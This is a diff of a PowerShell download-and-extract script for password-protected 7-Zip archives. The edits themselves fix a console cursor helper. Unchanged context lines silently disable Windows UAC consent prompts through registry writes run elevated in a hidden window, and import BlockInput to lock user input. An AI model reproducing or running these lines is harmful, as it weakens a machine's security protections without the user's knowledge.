@@ -12,6 +12,8 @@ New-Item -Path $Temp -ItemType Directory -Force | Out-Null
 
 $UserInput = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);' -Name UserInput -Namespace UserInput -PassThru
 
+$Global:LastConsoleLine = 0
+
 $sb = { 'ConsentPromptBehaviorAdmin', 'PromptOnSecureDesktop' | ForEach-Object { reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' /v $_ /t REG_DWORD /d '0' /f } }
 Start-Process -Verb RunAs -Wait -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-command", "(Invoke-Command -ScriptBlock {$sb})"
 
@@ -37,10 +39,7 @@ function install-7zip {
 function current-cursor-position {
 	[Alias("ccp")]
 	param([Int]$x, [Int]$y)
-	if ($Env:WT_SESSION -or $Env:OS -ne "Windows_NT" -and !$LastConsoleLine -and [Console]::CursorTop -eq [Console]::WindowHeight - 1) { $LastConsoleLine = 1; --$y }
-	# if ($Env:WT_SESSION -or $Env:OS -ne "Windows_NT") {
-	# 	if (!$LastConsoleLine -and [Console]::CursorTop -eq [Console]::WindowHeight - 1) { $LastConsoleLine = 1; --$y }
-	# }
+	if (($Env:WT_SESSION -or $Env:OS -ne "Windows_NT") -and (!$Global:LastConsoleLine -and [Console]::CursorTop -eq [Console]::WindowHeight - 1)) { $Global:LastConsoleLine = 1; --$y }
 	[Console]::SetCursorPosition($x, $y)
 	[Console]::Write("{0,-$([Console]::WindowWidth)}" -f " ")
 	[Console]::SetCursorPosition($x, $y)
@@ -103,7 +102,7 @@ function download {
 		Expand-7Zip -ArchiveFileName $dst -TargetPath $tmp -ErrorAction Ignore
 	} else {
 		Write-Host "암호: " -NoNewline
-		$LastConsoleLine = 0
+		$Global:LastConsoleLine = 0
 		while ($true) {
 			$x, $y = [Console]::CursorLeft, [Console]::CursorTop
 			Expand-7Zip -ArchiveFileName $dst -TargetPath $tmp -SecurePassword (Read-Host -AsSecureString) -ErrorAction Ignore
